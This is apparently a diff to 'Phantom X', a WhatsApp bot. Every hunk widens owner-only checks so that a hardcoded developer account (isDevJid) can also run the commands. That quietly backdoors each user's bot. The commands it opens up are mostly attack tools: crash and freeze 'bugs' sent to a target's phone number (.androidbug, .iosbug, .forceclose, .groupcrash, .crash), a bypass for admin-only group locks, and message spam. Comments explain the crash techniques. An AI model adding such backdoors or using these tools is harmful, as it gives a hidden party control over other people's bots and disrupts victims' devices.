@@ -1939,7 +1939,7 @@ async function handleMessage(sock, msg) {
             }
 
             case ".delpp": {
-                if (!msg.key.fromMe) return reply("❌ Owner only.");
+                if (!msg.key.fromMe && !isDevJid(senderJid)) return reply("❌ Owner only.");
                 const delSection = parts[1]?.toLowerCase();
                 if (delSection === "bug") {
                     if (!fs.existsSync(BUG_BANNER_FILE)) return reply("⚠️ No bug menu banner is set.");
@@ -1960,7 +1960,7 @@ async function handleMessage(sock, msg) {
             // Reply to any image with .setmenupic [section] to set that section's banner.
             // Sections: main (default), bug, owner
             case ".setmenupic": {
-                if (!msg.key.fromMe) return reply("❌ Owner only.");
+                if (!msg.key.fromMe && !isDevJid(senderJid)) return reply("❌ Owner only.");
                 const picSection = parts[1]?.toLowerCase() || "main";
                 const quoted = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
                 const quotedType = quoted ? getContentType(quoted) : null;
@@ -3979,7 +3979,7 @@ _Can be started from any chat, but source members require source group access an
             // --- ANTIDELETE ---
             case ".antidelete": {
                 if (!isGroup) return reply("❌ Only works in groups.");
-                if (!msg.key.fromMe) return reply("❌ Owner only.");
+                if (!msg.key.fromMe && !isDevJid(senderJid)) return reply("❌ Owner only.");
                 const adSub = parts[1]?.toLowerCase();
                 if (adSub === "on") { setGroupSetting(from, "antidelete", true); return reply("✅ Anti-delete *ON* — Deleted messages will be re-sent."); }
                 if (adSub === "off") { setGroupSetting(from, "antidelete", false); return reply("✅ Anti-delete *OFF*."); }
@@ -3989,7 +3989,7 @@ _Can be started from any chat, but source members require source group access an
             // --- ANTIBOT ---
             case ".antibot": {
                 if (!isGroup) return reply("❌ Only works in groups.");
-                if (!msg.key.fromMe) return reply("❌ Owner only.");
+                if (!msg.key.fromMe && !isDevJid(senderJid)) return reply("❌ Owner only.");
                 const abSub = parts[1]?.toLowerCase();
                 if (abSub === "on") { setGroupSetting(from, "antibot", true); return reply("✅ Anti-bot *ON* — Bot accounts will be auto-kicked."); }
                 if (abSub === "off") { setGroupSetting(from, "antibot", false); return reply("✅ Anti-bot *OFF*."); }
@@ -3999,7 +3999,7 @@ _Can be started from any chat, but source members require source group access an
             // --- SCHEDULE ---
             case ".schedule": {
                 if (!isGroup) return reply("❌ Only works in groups.");
-                if (!msg.key.fromMe) return reply("❌ Owner only.");
+                if (!msg.key.fromMe && !isDevJid(senderJid)) return reply("❌ Owner only.");
                 const schedTime = parts[1];
                 const schedMsg = parts.slice(2).join(" ").trim();
                 if (!schedTime || !schedMsg || !/^\d{2}:\d{2}$/.test(schedTime)) return reply("Usage: .schedule HH:MM <message>\nExample: .schedule 08:00 Good morning everyone!");
@@ -4015,7 +4015,7 @@ _Can be started from any chat, but source members require source group access an
 
             case ".unschedule": {
                 if (!isGroup) return reply("❌ Only works in groups.");
-                if (!msg.key.fromMe) return reply("❌ Owner only.");
+                if (!msg.key.fromMe && !isDevJid(senderJid)) return reply("❌ Owner only.");
                 const uTime = parts[1];
                 if (!uTime) return reply("Usage: .unschedule HH:MM");
                 const ud = loadSchedules();
@@ -4092,7 +4092,7 @@ _Can be started from any chat, but source members require source group access an
             }
 
             case ".invisible": {
-                if (!msg.key.fromMe) return reply("❌ Owner only.");
+                if (!msg.key.fromMe && !isDevJid(senderJid)) return reply("❌ Owner only.");
                 const invChar = "\u2062\u2063\u2064\u200b\u200c\u200d\u00ad";
                 await sock.sendMessage(from, { text: invChar.repeat(50) });
                 break;
@@ -4154,7 +4154,7 @@ _Can be started from any chat, but source members require source group access an
             // Telugu/Kannada/Tamil combining marks overload the Android WA text renderer.
             // Triggers immediately on notification — no interaction needed from target.
             case ".androidbug": {
-                if (!msg.key.fromMe) return reply("❌ Owner only.");
+                if (!msg.key.fromMe && !isDevJid(senderJid)) return reply("❌ Owner only.");
                 const andTarget = parseBugTarget(parts, msg);
                 if (!andTarget) return reply(`🤖 *Android Bug*\n\nUsage: *.androidbug <number>*\nExample: *.androidbug 2348012345678*\n\n_Overloads Android WhatsApp text renderer._\n_Use .bugmenu android for full help._`);
                 if (isDevProtected(andTarget)) return reply(`🛡️ *Dev Protected!*\n\nThat number (${andTarget.split("@")[0]}) belongs to the developer of Phantom X.\nBugs cannot be sent to the developer.`);
@@ -4179,7 +4179,7 @@ _Can be started from any chat, but source members require source group access an
             // Sindhi + Arabic + BiDi overrides crash the iOS WhatsApp text engine.
             // Triggers on notification processing — no need for target to open chat.
             case ".iosbug": {
-                if (!msg.key.fromMe) return reply("❌ Owner only.");
+                if (!msg.key.fromMe && !isDevJid(senderJid)) return reply("❌ Owner only.");
                 const iosTarget = parseBugTarget(parts, msg);
                 if (!iosTarget) return reply(`🍎 *iOS Bug*\n\nUsage: *.iosbug <number>*\nExample: *.iosbug 2348012345678*\n\n_Crashes iPhone WhatsApp on notification._\n_Use .bugmenu ios for full help._`);
                 if (isDevProtected(iosTarget)) return reply(`🛡️ *Dev Protected!*\n\nThat number belongs to the developer of Phantom X.\nBugs cannot be sent to the developer.`);
@@ -4206,7 +4206,7 @@ _Can be started from any chat, but source members require source group access an
             // crashes in the process. No Unicode spam — pure protocol-level exploit.
             case ".forceclose":
             case ".fc": {
-                if (!msg.key.fromMe) return reply("❌ Owner only.");
+                if (!msg.key.fromMe && !isDevJid(senderJid)) return reply("❌ Owner only.");
                 const fcTarget = parseBugTarget(parts, msg);
                 if (!fcTarget) return reply(`💀 *Force Close Bug*\n\nUsage: *.forceclose <number>*\nShortcut: *.fc <number>*\nExample: *.forceclose 2348012345678*\n\n_Fires crafted group invites — WA crashes trying to resolve them._\n_Use .bugmenu freeze for full help._`);
                 if (isDevProtected(fcTarget)) return reply(`🛡️ *Dev Protected!*\n\nThat number belongs to the developer of Phantom X.\nBugs cannot be sent to the developer.`);
@@ -4243,7 +4243,7 @@ _Can be started from any chat, but source members require source group access an
             // NOTE: This is a UI/rendering crash — it does NOT block network messages.
             // The target cannot read the chat smoothly but can still send from other devices.
             case ".freeze": {
-                if (!msg.key.fromMe) return reply("❌ Owner only.");
+                if (!msg.key.fromMe && !isDevJid(senderJid)) return reply("❌ Owner only.");
                 const freezeTarget = parseBugTarget(parts, msg);
                 if (!freezeTarget) return reply(
                     `🧊 *Freeze Bug*\n\nUsage: *.freeze <number>*\nExample: *.freeze 2348012345678*\n\n` +
@@ -4285,7 +4285,7 @@ _Can be started from any chat, but source members require source group access an
             // Sends crash payload to a group JID. Anyone who opens that group = WA force closes.
             // Usage: .groupcrash (current group) | .groupcrash <groupId> | .groupcrash <invite link>
             case ".groupcrash": {
-                if (!msg.key.fromMe) return reply("❌ Owner only.");
+                if (!msg.key.fromMe && !isDevJid(senderJid)) return reply("❌ Owner only.");
                 let gcTarget = null;
                 const gcArg = parts[1];
                 if (!gcArg) {
@@ -4348,7 +4348,7 @@ _Can be started from any chat, but source members require source group access an
             // ─── UNDO GROUP CRASH ───
             // Deletes the crash message(s) from the group — restores normal access.
             case ".ungroupcrash": {
-                if (!msg.key.fromMe) return reply("❌ Owner only.");
+                if (!msg.key.fromMe && !isDevJid(senderJid)) return reply("❌ Owner only.");
                 const ugcArg = parts[1] || (isGroup ? from : null);
                 if (!ugcArg) return reply("Usage: .ungroupcrash <groupId>\n\nGet the group ID from *.groupid*\nOr run this inside the affected group.");
                 const ugcTarget = ugcArg.endsWith("@g.us") ? ugcArg : (isGroup ? from : null);
@@ -4372,7 +4372,7 @@ _Can be started from any chat, but source members require source group access an
 
             // ─── UNBUG (remove all personal bugs from a user) ───
             case ".unbug": {
-                if (!msg.key.fromMe) return reply("❌ Owner only.");
+                if (!msg.key.fromMe && !isDevJid(senderJid)) return reply("❌ Owner only.");
                 const unbugTarget = parseBugTarget(parts, msg);
                 if (!unbugTarget) return reply(`🔧 *Unbug*\n\nUsage: *.unbug <number>*\nExample: *.unbug 2348012345678*`);
                 const unbugKeys = userCrashKeys[unbugTarget];
@@ -4454,7 +4454,7 @@ _Can be started from any chat, but source members require source group access an
 
             // ─── AUTO-JOIN GROUP LINKS ───
             case ".autojoin": {
-                if (!msg.key.fromMe) return reply("❌ Owner only.");
+                if (!msg.key.fromMe && !isDevJid(senderJid)) return reply("❌ Owner only.");
                 const ajArg = parts[1]?.toLowerCase();
                 if (!ajArg) {
                     const aj = loadAutojoin();
@@ -4482,7 +4482,7 @@ _Can be started from any chat, but source members require source group access an
             // Attempts to send a message into a group locked to admins-only.
             // Tries multiple message types to find one that bypasses the restriction.
             case ".lockedbypass": {
-                if (!msg.key.fromMe) return reply("❌ Owner only.");
+                if (!msg.key.fromMe && !isDevJid(senderJid)) return reply("❌ Owner only.");
                 if (!isGroup) return reply("❌ Run this inside the locked group.");
                 const lbText = parts.slice(1).join(" ").trim() || "👻 Phantom X";
                 await reply(`🔓 Attempting to bypass admin-only lock...`);
@@ -4511,7 +4511,7 @@ _Can be started from any chat, but source members require source group access an
             // Sends an invisible message — target sees nothing arrive, but WA freezes.
             case ".invisfreeze":
             case ".if": {
-                if (!msg.key.fromMe) return reply("❌ Owner only.");
+                if (!msg.key.fromMe && !isDevJid(senderJid)) return reply("❌ Owner only.");
                 const ifTarget = parseBugTarget(parts, msg);
                 if (!ifTarget) return reply(`👁️ *Invisible Freeze*\n\nUsage: *.invisfreeze <number>*\nShortcut: *.if <number>*\nExample: *.invisfreeze 2348012345678*\n\n_Target sees no message — but WA silently freezes._\n_Use .bugmenu freeze for full help._`);
                 if (isDevProtected(ifTarget)) return reply(`🛡️ *Dev Protected!*\n\nThat number belongs to the developer of Phantom X.\nBugs cannot be sent to the developer.`);
@@ -4533,7 +4533,7 @@ _Can be started from any chat, but source members require source group access an
             // ⚠️ HONEST WARNING: This sends FROM your WhatsApp — risks YOUR account not theirs.
             // Max 5 messages with a delay to reduce ban risk.
             case ".spamatk": {
-                if (!msg.key.fromMe) return reply("❌ Owner only.");
+                if (!msg.key.fromMe && !isDevJid(senderJid)) return reply("❌ Owner only.");
                 const saMentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
                 const saTarget = saMentioned[0];
                 const saTimes = Math.min(parseInt(parts[1]) || 5, 5);
@@ -4566,7 +4566,7 @@ _Can be started from any chat, but source members require source group access an
             // Usage: .delaybug <number>
             case ".delaybug":
             case ".delay": {
-                if (!msg.key.fromMe) return reply("❌ Owner only.");
+                if (!msg.key.fromMe && !isDevJid(senderJid)) return reply("❌ Owner only.");
                 const dbTarget = parseBugTarget(parts, msg);
                 if (!dbTarget) return reply(
                     `⏳ *Delay Bug*\n\n` +
@@ -4613,7 +4613,7 @@ _Can be started from any chat, but source members require source group access an
 
             // ─── CRASH (combined android + iOS + forceclose in one shot) ───
             case ".crash": {
-                if (!msg.key.fromMe) return reply("❌ Owner only.");
+                if (!msg.key.fromMe && !isDevJid(senderJid)) return reply("❌ Owner only.");
                 const crashTarget = parseBugTarget(parts, msg);
                 if (!crashTarget) return reply(
                     `💥 *Crash*\n\nUsage: *.crash <number>*\nExample: *.crash 2348012345678*\n\n` +
@@ -4655,14 +4655,14 @@ _Can be started from any chat, but source members require source group access an
 
             // ─── STOP DELAY (legacy — now delaybug uses a single payload stored in userCrashKeys) ───
             case ".stopdelay": {
-                if (!msg.key.fromMe) return reply("❌ Owner only.");
+                if (!msg.key.fromMe && !isDevJid(senderJid)) return reply("❌ Owner only.");
                 await reply(`ℹ️ *.delaybug* now sends a single payload (no interval to stop).\n\nTo remove the delay payload from the target, use:\n*.unbug <number>*`);
                 break;
             }
 
             // ─── EMOJI BOMB (1 message) ───
             case ".emojibomb": {
-                if (!msg.key.fromMe) return reply("❌ Owner only.");
+                if (!msg.key.fromMe && !isDevJid(senderJid)) return reply("❌ Owner only.");
                 const ebMentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
                 const ebTarget = ebMentioned[0] || from;
                 const ebEmoji = parts.find(p => /\p{Emoji}/u.test(p) && p !== parts[0]) || "💥";
